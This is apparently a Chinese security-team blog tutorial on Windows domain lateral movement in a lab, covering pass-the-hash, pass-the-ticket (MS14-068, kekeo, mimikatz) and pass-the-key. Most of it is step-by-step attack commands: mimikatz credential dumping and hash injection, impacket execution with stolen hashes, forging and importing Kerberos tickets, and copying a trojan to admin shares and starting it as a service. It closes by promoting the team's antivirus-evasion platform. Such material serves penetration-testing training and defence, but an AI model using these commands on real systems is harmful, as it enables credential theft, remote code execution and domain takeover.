> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/uWuNqKYloTQCifKjsXMB2Q)

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVEB0NZ87EFzNM4866ybBQMVhN8RQR8c6zEaACxatlch2rgdzYzYAiahr1GUq1cLMMGVnvKpF8biaWA/640?wx_fmt=png)

PTH
---

### 什么是 PTH？

pass the hash：哈希传递攻击，简称 PTH，是在内网渗透中一种很经典的攻击方式，原理就是攻击者可以直接通过 LM Hash 或 NTLM Hash 访问远程主机或服务，而不用提供明文密码。在域环境中，用户登录计算机时使用的大部分都是域账号，大量计算机在安装时会使用相同的本地管理员账户密码。因此，如果计算机的本地管理员账号和密码也是相同的，攻击者就可以使用哈希传递的方法登录到内网主机的其他计算机。因此，此类攻击适用于：

*   • 域 / 工作组环境
    
*   • 可以获得 hash，但是条件不允许对 hash 进行爆破
    
*   • 内网中存在和当前机器相同的密码
    

另外需要注意在 Windows server 2012 R2 之前使用到的密码散列值是 LM Hash、NTLM Hash，在 2012 R2 及其版本之后使用到的密码散列值是 NTLM Hash。

### PTH 利用手法

当前演示环境如下：

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXFF3r31c9nTd0iblyBpu0q23ZVpoWSgHL6uqiaEHCjJOI3hySI5DyujEmsK8EW5ev9rmO8S6qia8XRA/640?wx_fmt=png)

如上图，该内网环境，域名为 gog.org，共有 3 台机器，其中攻击者已经拿下了与该环境的 Webserver，并读取到了该机器中的 hash，接下来让我们尝试通过哈希传递的方式获取内网其他两台机器的控制权

#### mimikatz

其中我们的神器 mimikatz 就可以进行 PTH 攻击，但是 mimikatz 中的 PTH 攻击会在当前目标机器桌面中弹一个 cmd 窗口，所以不适合 CS 使用，适合获得当前目标桌面权限后再使用该命令去进行横向移动。首先我们先在 Webserver 中上传 mimikatz，并读取 hash:

```
privilege::debug # 提升权限
sekurlsa::logonpasswords # 抓取密码

```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXFF3r31c9nTd0iblyBpu0q2j4eibzpgZVe0Oog7zaQOE2Mmrfqrg2cibgFL40kYGBflMvD35TGtJ75g/640?wx_fmt=png)

获得本地管理员用户的 Hash 后，用 mimikatz 将 administrator 的 hash 添加到 lsass 进程中

```
sekurlsa::pth /user:administrator /domain:192.168.3.32 /ntlm:518b98ad4178a53695dc997aa02d455c

```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXFF3r31c9nTd0iblyBpu0q2kaNicmylJBicBTPWedFJNSr63kRhDIUicXOSicYFefwic22bXFeibT0AcRsw/640?wx_fmt=png)

成功后会弹出一个新的 cmd 窗口，这时再去访问远程主机服务，就不需要提供明文密码了，直接连接即可

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXFF3r31c9nTd0iblyBpu0q25rRH8ueDBGPyib3Vkeg6BGx0pjSnlhRU4PpncjVVQoWiaj9J3ZJIJfbQ/640?wx_fmt=png)

这时我们将 192.168.3.32 上线到 CS 中，就可使用将木马复制到该机器中，然后使用 sc 创建一个服务绑定木马，然后启动该服务上线即可，具体实现命令如下：

```
copy 4444.exe \\192.168.3.32\c$\  # 上传木马到目标机器中
sc \\192.168.3.32 create bindshell binpath= "c:\4444.exe" # 创建shell服务并绑定文件

```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXFF3r31c9nTd0iblyBpu0q2ZbNudV0WvfKE8IK47E8AxnDwbHduCGiagBTfZ3T0ceqZ5dxqapEWtUQ/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXFF3r31c9nTd0iblyBpu0q234Y4wvGpyd71qANXibxxmk7mibqibvGLeNN19UjXX4FSl9xicEcgZicfhpg/640?wx_fmt=png)

可以看到目标机器中已经创建了 bindshell 服务，这里我们直接启用该服务即可

```
sc \\192.168.3.32 start bindshell # 启动bindshell服务

```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXFF3r31c9nTd0iblyBpu0q2rv48ibT1S0nXARZWbluQAFk7Xiblw3GIicwFG2WNBribjLfooj4jGf0pWg/640?wx_fmt=png)

启动之后 3.32 成功上线。但是，在使用 mimikatz 进行哈希传递攻击时需要注意以下几点：

1.  1. 使用 mimikatz 进行哈希传递要具有本地管理员权限
    
2.  2. dir 命令后面尽量跟主机名，否则可能会报错
    
    #### impacket 套件
    
    除了 mimikatz 之外，像之前我们提到的 impacket 中的 smbexec、wmiexec、psexec 都可以进行 PTH 攻击。`python psexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.32 "whoami"`
    

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXFF3r31c9nTd0iblyBpu0q2mduwWPa8NPvnaiczdRCLPVwxMrXWdp0jGaoia3JhFuH4ib6MBbmsd6Cmw/640?wx_fmt=png)

```
python wmiexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 "whoami"

```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXFF3r31c9nTd0iblyBpu0q2hsQzRtm3oddJlasjGUMRIt7RbzkVu5KdzB23Ez7bp4Cania9BJibv9JQ/640?wx_fmt=png)

```
python smbexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32

```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXFF3r31c9nTd0iblyBpu0q2SV1mBIuPC6nyaudDOlH8jaORzUSbVcNRE164SPX9xZTuFo085Yqftw/640?wx_fmt=png)

PTT
---

pass the ticket：票据传递攻击，简称 PTT，利用的票据凭证 TGT 进行的横向移动，它是利用 Kerberos 协议进行攻击的，这里介绍三种常见的攻击方法：MS14-068、Golden Ticket、SILVER ticket，简单来说就是将连接合法的票据注入到内存中实现连接。缺点：票据是有效期的，一般默认为 10 小时。

### MS14-068

MS14-068 是密钥分发中心（KDC）服务中的 Windows 漏洞，它允许经过身份验证的用户在其 Kerberos 票据（TGT）中插入任意 PAC。该漏洞位于 kdcsvc.dll 域控制器的密钥分发中心（KDC) 中，用户可以通过呈现具有改变的 PAC 的 Kerberos TGT 来获得票证。MS14-068 所造成的危害是允许域内任何一个普通用户都可以将自己提升为域管权限。微软给出的修复补丁是 KB3011780，漏洞攻击是否成功要看目标机器打没打 KB3011780 补丁。

#### 漏洞利用

可以看到当前我们所处的身份是域内的一个普通用户，是无法对域控进行文件操作的。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXFF3r31c9nTd0iblyBpu0q2RkpgBtE3U9gI95T2acNFAnBuDLAXFjn0eUibNDxBCJR9pskia4xibkX0w/640?wx_fmt=png)

这里我们第一步先获取当前机器的 SID

```
shell whoami/user

```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXFF3r31c9nTd0iblyBpu0q2QlGZyuL6wSIOVT2yFEr9u5hHHRMg9CcF1hKCnU0ERRq213Ybja8ZeA/640?wx_fmt=png)

拿到 SID 后，使用我们的 ms14-068.exe 生成一个票据文件。-u 指定当前用户，-s 输入我们刚刚获取到的 SID，-p 输入当前用户密码，具体命令如下

```
shell ms14-068.exe -u webadmin@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1132 -d 192.168.3.21 -p admin!@#45

```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXFF3r31c9nTd0iblyBpu0q2aiadrkeFl1tVn3HZ4VycIF08t1VZpMDibgbib9UKJVafd7D7xokBFlBicg/640?wx_fmt=png)

执行该命令后可以看到当前目录生成了一个票据文件。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXFF3r31c9nTd0iblyBpu0q2mlgAOzuxrN9xdxoqibx6UNtWLiadoG9XlZnyjdKA6pm8hORdU1onZhcw/640?wx_fmt=png)

这里生成票据文件后，就可以尝试连接目标看能否进行操作 首先清除下票据，以防该连接是以之前的票据进行连接的

```
shell klist purge

```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXFF3r31c9nTd0iblyBpu0q2QSiahpvhXMBae9oKgtERBiaMb0kIRt7LlKv3Dy4I0ADBwBcPjH9eLMhA/640?wx_fmt=png)

票据为空后，这里我们直接开始使用 mimikatz 导入票据，之后再来查看当前电脑的票据信息，看其是否有产生新的票据

```
mimikatz kerberos::ptc TGT_webadmin@god.org.ccache
shell klist

```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXFF3r31c9nTd0iblyBpu0q2IR6UbkicareozUiac1CMCRyROELvbWsicSYwe35wmtn1RAemIItBuT1Sw/640?wx_fmt=png)

票据为空后，这里我们直接尝试与目标主机进行连接创建服务进行上线 (这里建议在连接时，使用主机名进行连接，IP 地址容易产生失败的问题)

```
shell net use \\OWA2010CN-GOD\c$
shell copy 4444.exe \\OWA2010CN-GOD\c$
shell sc \\OWA2010CN-GOD create binshel1 binpath= "c:\4444.exe"
shell sc \\OWA2010-GOD start binshel1

```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXFF3r31c9nTd0iblyBpu0q2da6mpdtpROyiawicgQP3O2b1D0NJeU0P4ZhdUMZNaOvUVkKCicDQgjLtw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXFF3r31c9nTd0iblyBpu0q2TPGEb8I5bUxNVZIpdmq4pkicIzWudu4P5skica76F0x2DW2BwHR3uyicg/640?wx_fmt=png)

成功执行上线到 CS，相对来说，MS14-068 这个漏洞利用条件较为简单，如果域控没有打 KB3011780 补丁，哪怕一个普通用户权限也可以去尝试该漏洞进行利用。

### kekeo

利用获取到的 NTLM 生成新的票据去尝试，成功与否看 NTLM 是否正确 缺点：票据是有效期的，所以如果当前主机在链接过域控的话，有效期内可利用。kekeo 和下面的 mimikatz 与刚刚我们上面的 ms14-068 原理不太一样，ms14-068 是基于漏洞，去允许域内任何一个普通用户将自己提升为域管权限，而 kekeo 和 mimikatz 是基于 hash 生成票据，然后再进行连接。这里假设我们已经通过横向其他机器，拿到了域控的 hash，然后通过 kekeo 来伪造票据进行连接。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXFF3r31c9nTd0iblyBpu0q2f3Yd3QCSVz6VicXlkN4zHaOUr2XB6w48MdibGhoiaRBXfrVslwIB6bbMQ/640?wx_fmt=png)

首先来看我们现在跳板机中的票据是空的

```
shell klist 

```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXFF3r31c9nTd0iblyBpu0q2zM3ughGTxZ1eEukbLouCUjzU80QMkaibzSiblY8rgoynDkhPBCoeXGDw/640?wx_fmt=png)

然后上传我们的 kekeo 文件，首先先生成票据

```
shell kekeo "tgt::ask /user:Administrator /domain:god.org /ntlm:ccef208c6485269c20db2cad21734fe7" "exit"

```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXFF3r31c9nTd0iblyBpu0q2j892T59c8fHUQCQQhqy1gC6Zy1h0UicwyC3h3r2ogZTh8ODqmJV69fA/640?wx_fmt=png)

生成好后，可以看到当前目录会生成一个文件

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXFF3r31c9nTd0iblyBpu0q2FcdrJ1wJSSz8Th4kBudBUFaTsibIrNZnG4hk4kH0bPTiahnb2WWJfjjw/640?wx_fmt=png)

该文件就是我们刚刚所生成的票据文件，接下来我们将它导入到内存中后，再来看我们的当前跳板机中有没有新增票据

```
shell kekeo "kerberos::ptt TGT_Administrator@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi" "exit"
shell klist 

```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXFF3r31c9nTd0iblyBpu0q2d3BGqicXpFFiaIdVxt2kyw2wbplXcEG0klSoLvQQFGXPCFfnZaZx7jMg/640?wx_fmt=png)

可以看到成功导入了一个票据，那这里我们对域控进行尝试连接

```
shell dir \\owa2010cn-god\c$

```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXFF3r31c9nTd0iblyBpu0q2VbsV4mWLh43mMF91icTxXopebEpIzGaIsSZziaGDAicRk7DkEibWZiaKygw/640?wx_fmt=png)

成功连接，那现在我相信大家可能都有一个疑问，就是现在都有了 hash 了，我直接使用 pth 去横向他不是更方便吗，为什么还要多此一举去生成票据之后，再用票据去进行横向呢？当然也是可以的，但是因为 pth 他所基于的协议，如 smb、wmi、icp 等，他们都依赖于 135、445、139 等端口等，那如果在环境中，出现端口、协议被禁用的情况的话，可以尝试使用得到的 hash 生成票据来进行横向。

### MIMIKATZ

因为当前主机肯定之前与其他主机连接过，所以本地应该生成了一些票据，我们可以导出这些票据，然后在导入票据，利用，该方法类似于 cookie 欺骗。去利用历史遗留的票据重新认证尝试，成功与否看当前主机有没有被目标主机连接过。缺点：需要高权限用户 在进行本实验之前，需要先模拟一下域管用户在本机上的连接操作，留下票据之后在进行横向操作 (可以在域控中远程链接一下跳板机或向 C 盘写入一个文件并认证)。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXFF3r31c9nTd0iblyBpu0q2ZAofNt89e8xsfgzvA5Cz7rGxTdwVygSTBRGcod3cWkvnzC39udo2gA/640?wx_fmt=png)

如上图，我们假设这条票据是之前域管用户在跳板机中留下的历史票据，那这里我们可以使用 mimikatz 进行伪造票据。首先我们先将内存中的票据导出

```
mimikatz sekurlsa::tickets /export

```

导出后可以看到当前目录会出现一个票据文件

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXFF3r31c9nTd0iblyBpu0q2opBhDqIZ3ia5HdYU1WI9UmQupyHEbFibBDFUM2Spwd6BE36MNhVxqL8Q/640?wx_fmt=png)

这里再将其导入到内存中

```
mimikatz kerberos::ptt C:\Users\webadmin\Desktop\TGT_Administrator@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi

```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXFF3r31c9nTd0iblyBpu0q2uEvRcLawva7TBhyfJ0aksm92ZUd57krfibvia6so1gdo4qGP9BHTQQTA/640?wx_fmt=png)

导入成功后，这里我们直接进行对靶标进行连接

```
shell net use \\owa2010cn-god\c$
shell dir \\OWA2010CN-GOD\c$

```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXFF3r31c9nTd0iblyBpu0q2opluVgiaic6NiczJ2vNuXwpxcQYvrtjyz9I6SYC7cbwOHiahiagcJwhG3qA/640?wx_fmt=png)

PTK
---

pass the key：密钥传递攻击，简称 PTK，利用的 ekeys aes256 进行的横向移动，成功几率不是很高，利用条件苛刻 漏洞利用条件：当系统安装了 KB2871997 补丁且禁用了 NTLM 的时候，那我们抓取到的 NTLM hash 就失去了作用，但是可以通过 PTK 的攻击方式获得权限。首先使用 mimikatz 导出 aes 值

```
mimikatz sekurlsa::ekeys

```

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RXFF3r31c9nTd0iblyBpu0q293CVCgPxmxJYrGM7LuvVyvhjic1WyrdgLw0P4O5BpWGickvicoGpTIcOQ/640?wx_fmt=png)

导出后使用我们下面这条命令来进行利用

```
mimikatz sekurlsa::pth /user:域用户名 /domain:域名 /aes256:aes256值
mimikatz sekurlsa::pth /user:administrator /domain:god /aes256:1811e5811877a782b6c11e2b0165ffb88d40a633f922a012372095a43d72d7ae

```

执行后会在桌面弹出一个 cmd 窗口，这里就可以进行横向移动利用，但是上文也讲了，该移动方法的利用条件有点苛刻，他是目标系统必须打了 KB2871997 且禁用了 NTLM hash 传递时，才可以利用，但是由于我们的靶场环境并没有打 KB2871997 补丁且没有禁用 NTLM Hash，故无法利用成功。且当一个思路吧。

往期推荐

[敏感信息泄露](http://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247500219&idx=1&sn=8da48a9a049bab2f9215ad373868a1a5&chksm=ce5de3daf92a6acc7c2a58329c913062e9c34a9615ce742b761b2775916781abb50159a7d2d7&scene=21#wechat_redirect)  

[潮影在线免杀平台上线了](http://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247499902&idx=1&sn=59cba8d980b4ecb0deefff99edaabd4d&chksm=ce5de21ff92a6b09a8972a0144557b0099e443aa8e018b17151c816fc7f08f3615ecb22617fc&scene=21#wechat_redirect)  

[自动化渗透测试工具开发实践](http://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247498466&idx=1&sn=085c15679436dedb06a179ca8d47951a&chksm=ce5dd883f92a5195ef74ac517741f6d3da0da40b5501d72016e52cb70344904bb85b8aef65ba&scene=21#wechat_redirect)  

[【红蓝对抗】利用 CS 进行内网横向](http://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247492640&idx=1&sn=43b1991dc5628eab322923083fde8d70&chksm=ce5dc641f92a4f57ffb18e2977644b1f977fcc5e0eccdf10956d3ae4ce70dc95024500631e89&scene=21#wechat_redirect)  

[一个 Go 版 (更强大) 的 TideFinger](http://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247498344&idx=1&sn=3679330363ff6890166b09f6a502f769&chksm=ce5dd809f92a511f6066fcbb12fb5c1dc8c2642e4e2690dad64d76cc6f9247eae356d16f5810&scene=21#wechat_redirect)  

[SRC 资产导航监测平台 Tsrc 上线了](http://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247499823&idx=1&sn=065ffeae6bd02fff922cfb12c5a0f4df&chksm=ce5de24ef92a6b58f709260b691e6b36e4a53aac00d3022946302b8e638696ed55c70e13e16f&scene=21#wechat_redirect)

[新潮信息 - Tide 安全团队 2022 年度总结](http://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247506056&idx=1&sn=ad6dd23f58f5fd8ce899a1e292f5b685&chksm=ce5dfae9f92a73ff4f14c812436cb5bfecb29db04eada11c409e946d5338c82a92bcaa425736&scene=21#wechat_redirect)

[记一次实战攻防 (打点 - Edr - 内网 - 横向 - Vcenter)](http://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247498965&idx=1&sn=655548831da6808a020ad07294a92e60&chksm=ce5ddeb4f92a57a283d5692c246e54655319ab0d09f6403e354300a2777cda6ae4c787631ab3&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_gif/rTicZ9Hibb6RWbGNtVfIZbm2rmGO4hQDzQUrLN62vEGlA4fPmib5utUAp9gbQicb6FC82RjsVI5vx7wEc9yAAiaFEoQ/640?wx_fmt=gif)

E

N

D

  

**知识星球产品及服务**

**团队内部平台**：潮汐在线指纹识别平台 | 潮听漏洞情报平台 | 潮巡资产管理与威胁监测平台 | 潮汐网络空间资产测绘 | 潮声漏洞检测平台 | 在线免杀平台 | CTF 练习平台 | 物联网固件检测平台 | SRC 资产监控平台  | ......

**星球分享方向**:Web 安全 | 红蓝对抗 | 移动安全 | 应急响应 | 工控安全 | 物联网安全 | 密码学 | 人工智能 | ctf 等方面的沟通及分享

**星球知识 wiki**：红蓝对抗 | 漏洞武器库 | 远控免杀 | 移动安全 | 物联网安全 | 代码审计 | CTF | 工控安全 | 应急响应 | 人工智能 | 密码学 | CobaltStrike | 安全测试用例 | ......

**星球网盘资料**：安全法律法规 | 安全认证资料 | 代码审计 | 渗透安全工具 | 工控安全工具 | 移动安全工具 | 物联网安全 | 其它安全文库合辑  | ......

扫码加入一起学习吧~

![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn4bib2lic6dng5krLaNOdrDVLcLylWP1Op3Kibz2n6pOZjibrFd1xATEoZ6dXhaicMLgRQSicNQwGmDwicvA/640?wx_fmt=gif)

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUGxmZ0l89buUNbyVALKxic2nM7hnDCkAKIrjKhdcDfVkGq3PxNzgs7m55BBMwmicc0AvFpYcrd6J6Q/640?wx_fmt=jpeg)